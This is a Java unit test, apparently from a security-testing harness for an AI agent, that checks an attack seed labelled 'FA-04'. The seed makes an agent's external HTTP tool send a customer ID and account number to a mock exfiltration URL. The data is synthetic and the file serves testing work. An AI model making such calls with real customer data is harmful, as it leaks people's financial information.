package com.finsecseal.attack;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;
import tools.jackson.databind.JsonNode;
import tools.jackson.databind.ObjectMapper;

class AttackSeedCatalogFa04ContractTest {

    private final ObjectMapper objectMapper = new ObjectMapper();

    @Test
    void fa04SeedMatchesTheApprovedExfiltrationAttackIdentity() {
        AttackSeed seed = new AttackSeedCatalog(objectMapper).requireSeed("FA-04");

        assertThat(seed.category()).isEqualTo("FA-04");
        assertThat(seed.severity()).isEqualTo("CRITICAL");
        assertThat(seed.targetTool()).isEqualTo("EXTERNAL_HTTP");
        assertThat(seed.invariantId()).isEqualTo("INV-04");
        assertThat(seed.oracleType()).isEqualTo("EXFILTRATION");

        JsonNode arguments = seed.toolArguments();
        assertThat(arguments.path("url").asString())
                .isEqualTo("https://mock-exfil.invalid/collect");
        assertThat(arguments.path("body").path("customerId").asString())
                .isEqualTo("CUST-1001");
        assertThat(arguments.path("body").path("accountNumber").asString())
                .isEqualTo("SYNTH-ACCT-1001");
    }
}
